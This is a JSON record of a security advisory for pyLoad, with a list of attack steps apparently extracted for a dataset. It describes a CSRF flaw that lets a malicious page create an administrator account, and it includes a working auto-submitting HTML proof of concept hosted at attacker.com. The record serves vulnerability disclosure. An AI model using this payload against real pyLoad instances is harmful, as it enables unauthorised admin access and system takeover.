{"description": "### Summary\nThe `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.\n\n### PoC\nWe host the following HTML file on an attacker-controlled server.\n```html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"http://localhost:8000/api/add_user/%22hacker%22,%22hacker%22\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n\nIf we now trick an administrator into visiting our malicious page at `https://attacker.com/CSRF.html`, we see that their browser will make a request to `/api/add_user/%22hacker%22,%22hacker%22`, adding a new administrator to the `pyload` application.\n![image](https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png)\n\nThe attacker can now authenticate as this newly created administrator user with the username `hacker` and password `hacker`.\n![image](https://user-images.githubusercontent.com/44903767/294942635-c6d9adca-0f3a-4d99-92ac-6d3bf8e9ee01.png)\n\n### Impact\nAny API call can be made via a CSRF attack by an unauthenticated user.\n", "methods": ["Used Cross-Site Request Forgery (CSRF) to make any API call in pyLoad.", "Used GET requests to make API calls.", "Used an attacker-controlled server to host malicious HTML file.", "Used a form to submit a request to the pyLoad API.", "Used JavaScript to submit the form automatically.", "Used a malicious HTML file to trick an administrator's browser into making a request to the pyLoad API.", "Used a CSRF attack to add a new administrator user to the pyLoad application.", "Used the newly created administrator user to authenticate."]}
